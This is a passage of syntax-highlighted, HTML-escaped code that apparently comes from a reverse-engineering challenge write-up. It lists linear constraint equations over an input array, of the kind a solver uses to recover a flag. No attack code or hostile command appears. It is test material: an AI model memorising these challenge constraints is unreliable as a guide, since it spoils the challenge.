style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13521895&lt;/span&gt;
con25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;210978&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;300336&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;207254&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;216206&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63529&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;274903&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10750&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25008&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100942&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104857&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;266501&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;229070&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234559&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;298459&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;172052&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98938&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66155&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84761&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;283508&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;288577&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75407&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;204447&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4351595&lt;/span&gt;
con26 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;201846&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;272550&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60398&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45580&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;195108&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38596&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;220445&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;190873&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103477&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;118842&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;206336&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;249940&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48084&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104901&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48576&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;287104&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;286686&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30253&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;121183&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90967&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;195519&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;129304&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;141188&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56642147&lt;/span&gt;
con27 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110609&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5913&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;197578&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45127&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;282426&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71019&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6980&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;208216&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13544&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17852&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;167833&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;145568&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3610&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91985&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;267402&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32355&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;197823&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;135525&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;229424&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38093&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50167&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;118713&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123874&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89499&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43090537&lt;/span&gt;
con28 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;164755&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;175470&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28660&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7217&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;295102&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28531&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;106265&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;92750&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16738&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;231714&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;172042&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;215890&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;199697&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84235&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;44614&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75104&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;195843&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15784&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;131950&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;268167&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;197565&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24340&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105130&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79750&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;264668&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50329&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;137774797&lt;/span&gt;
